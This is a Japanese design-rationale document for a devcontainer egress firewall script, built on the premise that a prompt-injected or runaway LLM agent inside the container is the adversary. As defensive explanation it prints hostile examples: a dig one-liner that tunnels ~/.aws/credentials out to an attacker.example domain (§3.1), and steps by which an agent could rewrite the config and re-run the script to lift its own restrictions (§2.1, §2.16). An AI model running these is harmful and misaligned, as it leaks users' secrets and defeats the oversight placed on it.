# 設計判断

`init-project-firewall.sh` を**なぜそう作ったか**の記録です。

* **何が成り立つか**（規範記述）は [`spec.md`](./spec.md)
* **まだ解決していないこと**は [`known-issues.md`](./known-issues.md)
* **使い方**は [`../README.md`](../README.md)

この文書には、決定の根拠・検討した代替案・却下の理由を置きます。実装を変えたときに更新するのは `spec.md` で、こちらは判断が変わったときにだけ触ります。

## 1. 脅威モデル

### 1.1 敵はコンテナ内のエージェント自身

通常のファイアウォールは「外から来る攻撃者」を想定しますが、**このスクリプトが想定する敵は、コンテナの中で動いている LLM エージェントです。**

* プロンプトインジェクションを受けたエージェント
* 暴走したエージェント
* エージェントが実行した悪意あるコード（依存パッケージ、GitHub から取得したファイル）

いずれも `node` ユーザーの権限で、コンテナ内のあらゆるファイルを読み、任意のコマンドを実行できます。**秘密やソースコードを読める前提で、それを「どこへ出せるか」だけを制限する**のがこのスクリプトの役割です。

この前提が、他の多くの設計判断を規定しています。

* コンテナ内に書き込み可能な設定を置くと、それは設定ではなくなる（§2.1）
* INPUT 側のフィルタに実効性はない（allowlist に GitHub がある時点で任意コンテンツが入る）
* エージェントは再適用をいつでも実行できるので、再適用で変えられるものは守れない

### 1.2 守るもの

1. **漏洩シンクの制限** — 秘密やコードを書き出せる先を allowlist に限定する
2. **DNS 経路の固定** — 53 番宛を割り当てられたリゾルバのみに固定し、それ以外の試行を遮断・記録する
3. **攻撃プラットフォーム化の防止** — default DROP により C2 通信・スキャンの踏み台化を防ぐ

### 1.3 守らないもの（と、その理由）

| 守らないもの | 理由 |
|---|---|
| 悪性コンテンツの流入防止 | allowlist に GitHub / npm がある時点で任意のコンテンツは入る。INPUT 側フィルタに実効性はない |
| 完全な exfil 防止 | 許可先への GET クエリ経由など低帯域の経路が残る（§3.2） |
| DNS トンネリングの遮断 | 許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能（§3.1） |
| L7 制御（メソッド別・パス別） | iptables に見えるのは TCP 接続だけ。L7 proxy 移行時の担当範囲 |
| IPv6 の allowlist | 全 DROP で足りる（§2.12） |

### 1.4 なぜ L3/L4 なのか

本命は L7 proxy です。ワイルドカード対応・メソッド別制御・DNS トンネリング対策が同時に解けます。

それでも L3/L4 から始めたのは、**proxy はホスト側にコンポーネントを増やす**からです。devcontainer に閉じて完結し、`iptables` と `ipset` だけで動く構成のほうが、導入と検証のコストが桁違いに低い。`firewall.json` のスキーマをドメインリスト中心に保っているのは、proxy 設定へ変換可能にしておくためです。

## 2. 設計判断

### 2.1 実効設定を root 所有の固定パスに置き、探索を行わない

**決定:** 適用時に読むのは `/etc/egress-guard/firewall.json` のみ。探索は一切しない。repo 内の `.devcontainer/firewall.json` は「ソース」であり、イメージ再ビルドで実効設定になる。

**なぜ:** エージェントは sudoers により**いつでも再適用を実行できます**。再適用が読むファイルをエージェントが書き換えられるなら、root を取らずに 2 手でポリシー全体が無効になります。

1. `firewall.json` に `{"mode": "audit"}` または `{"allowDomains": ["attacker.example"]}` と書く（構文的に正当なのでバリデーションは全て通る）
2. `sudo /usr/local/bin/init-project-firewall.sh` を実行する

権限昇格は起きていませんが、目的は達成されています。

**この分離が生むもの:**

| 操作 | 実行者 | 必要な手順 |
|---|---|---|
| 再解決（CDN の IP 変動への追随） | エージェントで可 | 再適用のみ |
| ポリシー変更 | 人間 | repo の編集 + イメージ再ビルド |

CDN 対策としての「エージェント自身による再適用」は維持されます。

**探索を残さなかった理由（2 つ）:**

1. **構成非依存** — ワークスペースのマウント先は環境で変わる（`/workspace`、標準の devcontainer は `/workspaces/<name>`、その他）。特定のレイアウトを前提にした実装にしない
2. **攻撃面** — 「見に行く場所」を増やすほど、エージェントがポリシーを置ける候補地が増える

**代替案:** sudo 経由のときだけ固定パスにし、`--check-config` には探索を残す案（レビューでの提案）。採らなかったのは理由 1・2 の後者が効くため。まだインストールされていないファイルの検証は `--config` で足ります。

**コスト:** §3.5 を参照。

### 2.2 ネットワークを閉じてから allowlist を構築する

**決定:** IPv6 を最終状態（全 DROP）にし、IPv4 を bootstrap テーブル（loopback・リゾルバ・確立済みセッション・sshd のみ）にしてから、DNS だけを使って allowlist を組み立てる。

**なぜ:** 初版は「flush → 名前解決 → ルール適用」の順でした。この順序には 2 つの欠陥があります。

* **初回に全開放の窓ができる。** flush 直後は policy ACCEPT でチェーンが空
* **2 回目の実行が収束しない。** 1 回目が適用した OUTPUT DROP が、2 回目の名前解決を遮断する

閉じてから構築すれば、**リビルド中に外部ネットワークを必要とする工程が 1 つも無くなります**。途中で強制終了されても「開いたまま固定される」状態になりません。

GitHub meta API の取得だけは最終テーブル適用後です（そこに到達できるのが適用後のため）。失敗しても GitHub の主要ホストは DNS 解決で許可済みなので、best effort で構いません。

### 2.3 `iptables-restore` の単一トランザクションで適用する

**決定:** 各アドレスファミリのフィルタテーブルを、chain policy ごと `iptables-restore` の 1 入力で置き換える。

**なぜ:** `iptables -A` の逐次投入では、「policy は DROP になったがルールがまだ入っていない」「ルールは入ったが policy が ACCEPT のまま」という中間状態が観測されます。SIGKILL を受ければそこで固定されます。

単一トランザクションなら、**旧テーブルか新テーブルのどちらかしか観測されません**。

IPv4 と IPv6 は 1 つのトランザクションを共有できません。そのため IPv6 を先に最終状態へ確定させ、以降は触らない構成にしています。

### 2.4 nat テーブルを触らない

**決定:** filter テーブルのみ操作する。nat は読みも書きもしない。

**なぜ:** 初版は「Docker の DNS DNAT ルールを退避 → nat を flush → 復元」という手順でした。しかし**非特権ユーザーは nat に書き込めません**。エージェントが nat を汚染する経路が無い以上、退避・復元は守るものが無いまま複雑性と失敗点を増やすだけです。

`iptables-restore` は入力に含まれるテーブルしか置き換えないため、filter だけを渡せば nat は自動的に無傷です。

**検証:** ユーザー定義ネットワーク（nat に DNS DNAT が存在する構成）で、適用前後の `iptables-save -t nat` が完全一致することを実機確認済み。`DOCKER_OUTPUT` / `DOCKER_POSTROUTING` とも無傷でした。

### 2.5 allowlist は staging set に組み立てて `ipset swap` する

**決定:** ルールが参照する live set（`egress-allow-v4`）は名前だけ固定し、中身は staging set で組み立てて `ipset swap` でアトミックに差し替える。

**なぜ:**

* **部分的に構築された allowlist をルールが参照しない。** swap の時点で live なのは bootstrap テーブルで、そのテーブルは set を参照しない
* **冪等性の根拠になる。** staging を毎回作り直すため、前回の内容に依存しない。初版の「`destroy` → `create`」は、ルールが参照している set を destroy できず破綻する

### 2.6 DNS の DROP を汎用 ESTABLISHED ACCEPT より前に置く

**決定:** 53 番宛のルール群を `-m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT` より前に配置する。

**なぜ:** 後ろに置くと、**スクリプト適用前に確立されていた外部 DNS のフロー**（UDP の conntrack エントリ、TCP/53 接続）が ESTABLISHED として通り抜け、ポリシー変更をまたいでトンネリングを継続できます。

適用前に確立された接続一般については §3.3 で受容していますが、DNS だけは例外扱いにしています。DNS が抜けるとポリシー全体が無意味になるためです。

### 2.7 リゾルバを `resolv.conf` から検出する

**決定:** `127.0.0.11` を決め打ちせず、`/etc/resolv.conf` の `nameserver` 行から IPv4 アドレスを収集する。

**なぜ:** **Docker の埋め込みリゾルバ `127.0.0.11` はユーザー定義ネットワーク上でのみ提供されます。** デフォルトブリッジ上のコンテナには、ホスト側の DNS アドレスが直接書かれます。決め打ちでは起動しません（実機で最初に踏んだ問題です）。

`resolv.conf` は root 所有で Docker が書き込むため、非特権ユーザーがリゾルバを差し替えることはできません。収集したアドレスは iptables に渡る前に IPv4 として検証します。

IPv4 のリゾルバが 1 つも無い場合は、固定を緩めるのではなく停止します。DNS を開放するとポリシー全体が無意味になるためです。

### 2.8 適用フェーズを設定読み込みより前に始める

**決定:** `iptables` が使えると確認した時点で適用フェーズに入り、**設定エラーを含む**それ以降のあらゆる失敗を panic テーブルへ倒す。

**なぜ:** 以前は「設定の誤りで、既に入っているルールを乱すべきではない」という理由で、検証失敗時はルール未適用のまま終了していました。**その理屈が成り立つのは再適用時だけです。**

初回起動時の「直前のポリシー」は既定の全 ACCEPT です。そこで何も適用せずに終了すると、コンテナは開いたまま残ります。このスクリプトが防ごうとしている状態そのものです。

**コスト:** 設定にタイプミスがあるとコンテナが閉じます。`--check-config` で再ビルド前に気付けるため許容します（§2.18）。

**より強い解法:** コンテナの entrypoint で起動時点から最小 DROP ポリシーを適用し、このスクリプトはそこから展開する方式。検査の失敗が「開いたまま」に繋がる経路が原理的に消えます。現状は適用フェーズを前倒しすることで近似しています。

### 2.9 DNS 応答にも禁止レンジ検査をかける

**決定:** 名前解決で得た IP を `allowCidrs` と同じ禁止レンジ（RFC1918 / CGNAT / link-local / loopback / multicast / 予約）に照らし、該当するものは allowlist に入れない。

**なぜ:** `allowCidrs` には検査があるのに DNS 応答には無い、という非対称が**そのまま迂回路**でした。許可済みドメインのゾーンが攻撃者制御下にある、あるいは汚染された場合、`169.254.169.254`（クラウドのメタデータサービス）や RFC1918 アドレスを返すだけで allowlist に載ります。

しかも**エージェントは再適用の実行時刻を選べる**ため、DNS rebinding のタイミングを狙えます。

`host.docker.internal` だけは私設アドレスを返すのが正常なので、この検査を通さず専用の検査（§2.15）を使います。

### 2.10 ワイルドカードドメインを拒否する

**決定:** `*` を含む `allowDomains` エントリはバリデーションで拒否する。拒否メッセージに回避策を含める。

**なぜ:** allowlist は ipset（L3 の IP 集合）で、起動時に名前解決した結果を入れる方式です。パケットを見る時点でドメイン名は存在しません。そして **DNS には「あるゾーンのサブドメインを列挙する」手段がない**ため、`*.example.com` を IP の集合へ展開することは原理的にできません。

**代替案（旧実装）:** 受理して apex（`example.com`）だけ解決し、警告を出す。

これを止めたのは、**セキュリティ設定において「受理するが実現しない」のが最悪の性質**だからです。設定を書いた人は「サブドメイン全体が許可された」と信じ、実際には `api.example.com` も `db.example.com` も遮断されます。警告ではこの誤認を防げません。

初版仕様が例示に `*.neon.tech` を使っていたのは、実装能力を超えた記述であり仕様側の誤りでした。

**再導入:** L7 proxy 移行時にスキーマ version 2 で。proxy であればパケットにドメイン名（SNI / Host ヘッダ）が乗るため、展開せずにマッチできます。

### 2.11 遮断先を ipset に記録し、カーネルログに依存しない

**決定:** 遮断された宛先 IP を ipset `egress-audit-v4` に蓄積する。`LOG` ルールも入れるが、運用の前提にしない。

**なぜ:** 初版は「audit モードで数日回し、`dmesg` のログから必要ドメインを収集する」運用を想定していました。**これは二重に成立しません。**

* コンテナ内の `dmesg` は `CAP_SYSLOG` が無いため読めない
* `net.netfilter.nf_log_all_netns` が既定 `0` のため、**カーネルが非初期 netns からのログを抑制する**。つまりホストから読んでも出てこない

ipset なら、ホスト側の設定に依存せず、追加パッケージも不要で、コンテナ内で完結します。

**却下した案:**

* **`--cap-add=SYSLOG`** — コンテナ内から `dmesg` が読めるようになりますが、カーネルリングバッファは名前空間化されていないため、**ホストと他コンテナのカーネルログが全てエージェントから読めるようになります**。egress を絞る目的と正面から衝突します
* **`nf_log_all_netns=1`** — VM / ホストの再起動で 0 に戻り、全コンテナのログがホストの dmesg に混ざり、読み出しがコンテナ外の作業になります
* **`NFLOG` への移行** — `nfnetlink_log` は netns 対応なのでコンテナ内から `tcpdump -i nflog:1` で読めます。時刻・ポートまで必要になったら検討しますが、現状は ipset で足りています

**DNS の DROP には専用の記録ルールを置きます。** DNS の DROP は allowlist より前段にあるため、これが無いと**外部ネームサーバーへの試行（＝トンネリング試行）がどこにも残りません**。最も見たいシグナルが最も見えない状態になります。

bootstrap テーブルには記録ルールを入れません。`SET` ターゲットは任意のカーネルモジュールに依存し、最終テーブルにはフォールバックがある一方で bootstrap の失敗は致命的だからです。

### 2.12 IPv6 は allowlist を作らず全 DROP

**決定:** 外向き IPv6 は loopback を除いて全 DROP。audit モードでも DROP のまま。

**なぜ:**

1. **IPv4 だけ締めると allowlist が無意味になる。** 宛先アドレス選択（RFC 6724）は AAAA を優先するため、IPv6 経路が開いていれば allowlist を素通りできる
2. **allowlist を IPv6 にも作るのは割に合わない。** ipset の二重化、AAAA 解決、GitHub meta の v6 レンジ処理、自己検証の二重化が必要になる一方、セキュリティ上の利得はない
3. **閉じても壊れない。** Docker は既定で IPv6 を有効化しないため、コンテナに global IPv6 アドレスは付かない
4. **開けるリスクと閉じるコストが非対称**

### 2.13 `ip6tables` が使えず IPv6 スタックが生きているなら失敗する

**決定:** `ip6tables` が使えない場合、`/proc/net/if_inet6` が非空なら exit≠0。空ならスキップ。

**なぜ:** 「`ip6tables` が無い = IPv6 が無い」という推論は成り立ちません。バイナリ未導入、nft backend の不整合でも、**スタックは生きていて経路も張られます**。そこでスキップすると IPv6 が素通りし、§2.12 の 1 番目の理由がそのまま実現します。

### 2.14 自己検証のプローブを動的に選び、「いずれか一致」で判定する

**決定（プローブ）:** 外部 DNS のプローブは「設定済みリゾルバでないアドレス」、未許可先のプローブは「解決した IP が全て allowlist 外のホスト」を、候補リストから選ぶ。

**なぜ:** ハードコードすると、プロジェクトがそれを許可した瞬間に「**正しい設定なのに自己検証が壊れる**」状態になります。`example.com` を `allowDomains` に入れただけでコンテナが起動しなくなる、というのは実機で踏みました。

**決定（判定）:** `firewall.json` のドメイン検証は「再解決した IP の**いずれか**が allowlist にあれば成功」。

**なぜ:** 大規模 CDN は DNS ラウンドロビンで問い合わせのたびに異なる部分集合を返します。「最初の 1 IP」で判定すると、構築時と検証時で返る A レコード集合がずれた瞬間に、正しいポリシーがランダムに検証失敗します。自己検証の失敗は panic + exit≠0、すなわち**コンテナの起動失敗**です。fail-closed 側に倒れるとはいえ、正しい設定で起動が不安定になるのは運用上の欠陥です。

### 2.15 `host.docker.internal` も許可対象にし、私設アドレスであることを確認する

**決定:** `allowHostPorts` はデフォルトゲートウェイに加え `host.docker.internal` の解決結果も許可する。解決結果が RFC1918 / CGNAT / link-local であることを確認し、そうでなければ使わない。

**なぜ（両方許可）:** **Docker Desktop ではこの 2 つが別アドレスになります。** 実機では `172.17.0.1`（ゲートウェイ）と `192.168.65.254` で、しかもホストへの到達は後者経由でしか成立しませんでした（前者の ACCEPT ルールはパケットカウンタが 0）。ゲートウェイのみを許可する実装では、ホスト上のローカル DB に届きません。

**なぜ（アドレス検査）:** 公開アドレスが返るのは、名前が横取りされた場合です。そこにポートを開けば「ホスト宛の許可」ではなく**任意のインターネットホストへの穴**になります。

なお `host.docker.internal` は `/etc/hosts` ではなく **DNS で解決されています**（`resolve_domain` は `dig` を先に試し、Docker のリゾルバがこの名前に応答する）。デフォルトブリッジでもユーザー定義ネットワークでも同じでした。

### 2.16 sudoers は末尾 `""`、immutable は使わない

**決定（sudoers）:** `node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""` と書く。

**なぜ:** sudoers の仕様では、**Cmnd に引数を書かないと「任意の引数で実行してよい」という意味になります。** 引数なしのみを許可するには空の引数リスト `""` の明示が必要です。これを落とすとエージェントが `--config /tmp/evil.json` を渡せます。

スクリプト側にも多重防御があり、`SUDO_USER` / `SUDO_UID` が設定された状態で引数が渡されたら拒否します。sudoers を正しく書いていればここには到達しません。

**決定（immutable）:** `chattr +i` は使わない。

**なぜ:** `CAP_LINUX_IMMUTABLE` が Docker のデフォルト capability セットに含まれず、**`docker build` の `RUN` であっても失敗します**（実測）。加えて `chattr +i` が守るのは「root を取った攻撃者による書き換え」ですが、root を取られた時点で `chattr -i` も打てるため防御価値は限定的です。達成できず防御価値も限られるもののために複雑性を足しません。

成立している防御は次の 2 点です。

* ファイルが `root:root` 所有・`755`・`/usr/local/bin` 配下にあり、`node` に書き込み権限がない
* `node` に許可された sudo が当該スクリプトの引数なし実行のみで、`chattr` も `cp` も実行できない

### 2.17 基底プロファイルをスクリプトに埋め込む

**決定:** 全プロジェクト共通の allowlist を、同梱 JSON ではなくスクリプト本体に書く。

**なぜ:** 同梱 JSON は `node_modules` 内に置かれます。**非特権ユーザーが書き換えられる場所にポリシーの基底を置くのは、§2.1 と同じ誤り**です。

### 2.18 `--check-config` を残す

**決定:** 設定を検証して終了する開発用オプションを残す。sudo 経由では拒否する。

**なぜ:**

* **バリデータの end-to-end テストがこの経路にしかない。** `validate_domain` 等は source して直接呼べますが、未知フィールドの拒否・version 不一致・拒否メッセージの内容は `read_config` を通さないと検証できません
* **設定の反映に再ビルドが要るため、事前検証の価値が高い**（§2.1）。タイプミスの代償が「再ビルド → 起動失敗 → 修正 → 再ビルド」になります。`jq . firewall.json` では JSON 構文しか見ず、スキーマ・CIDR・ドメインの検証は通りません

### 2.19 配置をスクリプト自身が検証する

**決定:** スクリプト自身・`/etc/egress-guard/firewall.json`・その親ディレクトリについて、root 所有・非書き込み・非 symlink を起動時に検査する。

**なぜ:** 配置は利用者が書く Dockerfile の産物であり、間違えても**静かに弱い構成で動いてしまいます**。特に sudoers が `node_modules` 内を指していても、動作としては正常に見えます。

以前は README に手動確認手順（`ls -l` 4 行）を置いていましたが、**毎回のリビルド後に人が実行することを前提にした防御は機能しません**。スクリプトが検査すれば利用者の作業はゼロになります。

**限界:** §3.4 を参照。

## 3. 受容した残余リスク

「対策しないと決めた」ものです。未解決のものは [`known-issues.md`](./known-issues.md) にあります。

### 3.1 DNS トンネリングは防げない

53 番の宛先はリゾルバ 1 つに固定していますが、**そのリゾルバは再帰問い合わせをします。**

```sh
dig "$(base64 < ~/.aws/credentials | tr -d '\n' | cut -c1-60).exfil.attacker.example"
```

問い合わせは正規のリゾルバへ向かい、リゾルバが上流へ転送し、攻撃者の権威ネームサーバーにラベルが届きます。TXT レスポンスで戻りチャネルも作れます。tcp/53 を許可しているため帯域も出ます。

**埋め込みリゾルバ `127.0.0.11` でも同じです。** Docker デーモンがホスト側の netns から上流へ転送するため、コンテナの OUTPUT チェーンは上流パケットを見ません。リゾルバの選択では解決しません。

得られている性質は「**経路の固定と、それ以外の試行の遮断・記録**」であって、トンネリングの遮断ではありません。README と仕様書が当初これを「DNS トンネリングの遮断」と書いていたのは過大主張で、「DNS 経路の固定」に訂正しました。

**受容の理由:** 完全な遮断には L7 proxy か DNS 層の追加コンポーネント（応答ゾーンを allowlist に限定するリゾルバ）が要り、L3/L4 の範囲では原理的に届きません。§1.2 の目的は「漏洩先の限定」であり、「あらゆる低帯域チャネルの遮断」は Non-goal です。

### 3.2 許可先経由の低帯域 exfil

`GET https://allowed.example/?data=<秘密>` は防げません。書き込み権限を持つ GitHub トークンがあれば github.com 経由の持ち出しも可能です。

**受容の理由:** L3/L4 では HTTP メソッドもパスもクエリも見えません。対策は egress ではなくクレデンシャル側（prod キーをコンテナに置かない、fine-grained PAT を使う）で受け止めます。

### 3.3 適用前に確立された接続の継続

最終テーブルは `ESTABLISHED,RELATED` を ACCEPT するため（そうしないと通常の通信が成立しません）、**適用前に確立されていた allowlist 外への TCP 接続は継続できます**。

緩和が 2 つあります。

* **DNS だけは例外**（§2.6）
* **panic テーブルには OUTPUT の ESTABLISHED 許可がありません。** 失敗時は既存の接続も含めて遮断されます

**受容の理由:** `postStartCommand` はコンテナ起動直後、エージェントが動き出す前に実行されるため、実運用での影響は限定的です。

### 3.4 配置の検査は競合する攻撃者には勝てない

`assert_config_is_root_owned` は symlink・親ディレクトリ・所有者・モードを検査しますが、**検査と読み取りの間の差し替え（TOCTOU）は防げません**。ファイルは `stat` と複数回の `jq` でパス名から開き直されます。

閉じるには 1 つの fd を開いたまま全ての読み取りをそこから行う必要がありますが、**bash では表現できません**。

同様に、`assert_script_is_root_owned` は**悪意をもって差し替えられたスクリプトには無意味**です。差し替えた側が検査コードごと削除できます。

**受容の理由:** これらが捕まえる対象は**設定ミス**です。ワークスペースのファイルを bind mount で被せる、sudoers が `node_modules` を指す、といった誤りは確実に止まります。競合を成立させるには、まず親ディレクトリへの書き込み権限が必要で、`root:root` / `755` で配置していれば非特権ユーザーにその権限はありません。

**強くするなら:** §2.8 の「entrypoint で起動時点から閉じる」方式。検査の失敗が「開いたまま」に繋がる経路が消えます。

### 3.5 ポリシー変更にイメージ再ビルドが要る

§2.1 の直接の帰結です。`audit` モードで許可先を収集しながら `firewall.json` を育てるフェーズで、1 回の追記ごとに再ビルドが必要になります。

**受容の理由:** audit の収集は人間が回すフェーズであり、再解決（CDN の IP 変動への追随）は再適用だけで済むため、日常運用の頻度は上がりません。内容の検証だけなら `--check-config` で再ビルド不要です。

## 4. 運用構成の推奨と根拠

**ここはこのパッケージの必須要件ではありません。** スクリプトは割り当てられたリゾルバを読んでどちらの構成でも動き、埋め込みリゾルバでなければ警告を出すだけです。ネットワーク構成は利用側の Docker / devcontainer の領分であり、推奨を示すに留めます。

### 4.1 ユーザー定義ネットワークを推奨する理由

Docker の埋め込みリゾルバ `127.0.0.11` は**ユーザー定義ネットワーク上でのみ**提供されます。デフォルトブリッジではホスト側の DNS アドレスが直接書かれます。

| | 許可される宛先 | パケットの行き先 |
|---|---|---|
| 埋め込みリゾルバ | `127.0.0.11:53` | **コンテナ自身の netns 内。eth0 から出ない** |
| ホストのリゾルバ | 例 `192.168.65.7:53` | **eth0 から実際に出る**。実在のネットワーク上のサービスに届く |

### 4.2 ホストのリゾルバを許可するとは何が起きることか

**「実在のネットワーク機器に、ポート 53 で到達できる経路が 1 本開く」**ということです。

情報の取得（内部名の列挙など）は、**埋め込みリゾルバでも同じように可能**です。どちらのリゾルバも上流へ転送するため `dig jenkins.corp.local` は両方で解決します。**リゾルバの選択で変わるのは到達性（実在の機器にパケットが届くか）だけです。**

その到達性がどれだけ問題になるかは、ホストの OS で大きく変わります。

**Docker Desktop（macOS / Windows）— 影響は小さい**

コンテナは Linux VM の中で動いており、`192.168.65.0/24` は **VM の内部ネットワーク**です。

* `192.168.65.7` — Docker Desktop の DNS フォワーダ（VM 内のサービス）
* `192.168.65.254` — `host.docker.internal`（ホスト OS 自身）

許可されるのは `.7` の 53 番だけで、**この相手は VM 内で DNS 転送しかしていないコンポーネント**です。物理 LAN 上の機器ではありません。「LAN に穴が開く」状態にはなりません。

**Linux ホスト — 影響は大きい**

VM が挟まりません。デフォルトブリッジでは、Docker が**ホストの `/etc/resolv.conf` の nameserver をそのままコンテナに書き込みます**。許可先は次のような**実在の機器**になります。

* `192.168.1.1` — 家庭用ルータ
* `10.0.0.53` — 社内 DNS サーバー
* VPN 接続中なら、その先の DNS サーバー

**サンドボックスから、その機器の 53 番に到達できる状態になります。** ポートは 53 に限られますが、その DNS 実装の脆弱性・動的更新・キャッシュポイズニングは射程に入り、「コンテナは LAN 上の機器と通信できないはず」という前提が崩れます。

`allowCidrs` は RFC1918 を拒否しますが、**`resolv.conf` 由来のリゾルバアドレスはこの検証を通りません**（通したら名前解決が成立しないため）。つまり **RFC1918 の実機に、意図的に穴を 1 つ開けています。** 埋め込みリゾルバならこの穴自体が不要になります。

加えて Linux ホストでは動作上の利点もあります。ホストが `systemd-resolved`（`127.0.0.53`）を使っている場合、デフォルトブリッジでは Docker がループバックを除外して **`8.8.8.8` / `8.8.4.4` にフォールバック**します。埋め込みリゾルバならデーモン経由でホスト本来のリゾルバが使われ、社内名の解決も期待どおり動きます。

### 4.3 埋め込みリゾルバのデメリット

一方向に優れているわけではありません。

* **ユーザー定義ネットワークが前提になる** — 作成の手間、アドレスプールの枯渇（Docker 既定では 30 個前後）、不要になったネットワークの掃除（`docker network prune`）
* **nat テーブルに Docker の DNS DNAT ルールが増える** — 本スクリプトは nat を触らないため共存します（§2.4 で実機確認済み）
* **同一ネットワーク上のコンテナ名が引ける** — 埋め込み DNS の本来機能。§4.4 で分離すれば影響は自分のスタック内に閉じます
* **Docker デーモンへの依存が 1 段増える** — デーモンの DNS 機能が壊れると名前解決が止まります
* **DNS の観測性はむしろ下がる** — ホストのリゾルバ宛なら、ホスト側で `tcpdump` してどのコンテナが何を問い合わせたか追えます。埋め込みリゾルバではデーモンが集約するため、コンテナ単位の帰属が取りにくくなります

### 4.4 ネットワークをプロジェクトごとに分ける

**1 つのネットワークを全プロジェクトで共有しないでください。** 同じユーザー定義ネットワーク上のコンテナは相互に到達でき、埋め込み DNS が**コンテナ名で名前解決できてしまいます**。

egress-guard は大部分を守ります（相手の IP はブリッジのサブネット = RFC1918 で allowlist に載らないため REJECT）。ただし守れない面が残ります。

* **`sshdPort`（既定 22）は INPUT で `NEW` を許可しています。** 同居する全コンテナから叩ける口になります
* **firewall 適用前の窓** — `postStartCommand` 完了までは無防備です
* **egress-guard を入れていないコンテナ**が同居していれば、そちらは無制限です

分ければこれらは最初から発生しません。コストはほぼゼロです。

### 4.5 Docker Compose を第一推奨にする理由

Compose は**プロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります**。そのため次がまとめて解決します。

* `initializeCommand` が不要
* `--network` の指定が不要
* プロジェクトごとの分離が自動
* `docker compose down` でネットワークも消えるため、アドレスプールが枯渇しにくく `prune` も不要

Compose を使わない場合は `initializeCommand` でネットワークを用意します。ネットワーク名にプロジェクト名を含めれば、**設定文字列を全プロジェクトで同一にしたまま**分離できます。この場合、使い終わったネットワークは自動では消えないため定期的な `docker network prune` が要ります。

具体的な書き方は [`../README.md`](../README.md) を参照してください。
